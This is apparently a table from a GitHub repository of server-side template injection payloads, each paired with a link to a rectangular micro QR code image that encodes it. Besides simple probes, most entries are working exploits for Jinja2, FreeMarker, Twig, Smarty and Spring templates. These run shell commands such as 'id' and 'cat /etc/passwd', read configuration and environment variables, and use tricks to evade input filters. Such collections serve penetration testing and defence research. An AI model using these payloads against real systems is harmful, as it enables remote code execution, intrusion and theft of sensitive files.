## ssti

| Payload | rMQR |
| ----- | ----- |
| `{{2*2}}[[3*3]]` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/1.png) |
| `{{3*3}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/2.png) |
| `{{3*'3'}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/3.png) |
| `<%= 3 * 3 %>` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/4.png) |
| `${6*6}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/5.png) |
| `${{3*3}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/6.png) |
| `@(6+5)` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/7.png) |
| `#{3*3}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/8.png) |
| `#{ 3 * 3 }` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/9.png) |
| `{{dump(app)}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/10.png) |
| `{{config.items()}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/12.png) |
| `{{ ''.__class__.__mro__[2].__subclasses__() }}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/15.png) |
| `{{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/16.png) |
| `{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/17.png) |
| `{% for key, value in config.iteritems() %}<dt>{{ key\|e }}</dt><dd>{{ value\|e }}</dd>{% endfor %}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/18.png) |
| `{{'a'.toUpperCase()}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/19.png) |
| `{{ request }}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/20.png) |
| `{{self}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/21.png) |
| `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/23.png) |
| `[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/24.png) |
| `${"freemarker.template.utility.Execute"?new()("id")}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/25.png) |
| `{{app.request.query.filter(0,0,1024,{'options':'system'})}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/26.png) |
| `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/27.png) |
| `{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/28.png) |
| `{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/29.png) |
| `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/30.png) |
| `{$smarty.version}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/31.png) |
| ``{php}echo`id`;{/php}`` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/32.png) |
| `{{['id']\|filter('system')}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/33.png) |
| `{{['cat\x20/etc/passwd']\|filter('system')}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/34.png) |
| `{{['cat$IFS/etc/passwd']\|filter('system')}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/35.png) |
| `{{request\|attr([request.args.usc*2,request.args.class,request.args.usc*2]\|join)}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/36.png) |
| `{{request\|attr(["*"*2,"class","*"*2]\|join)}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/37.png) |
| `{{request\|attr(["__","class","__"]\|join)}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/38.png) |
| `{{request\|attr("__class__")}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/39.png) |
| `{{request.__class__}}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/40.png) |
| `${T(java.lang.System).getenv()}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/41.png) |
| `${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}` | [link](https://github.com/edoardottt/malicious-rMQR-Codes/blob/main/payloads/ssti/data/42.png) |
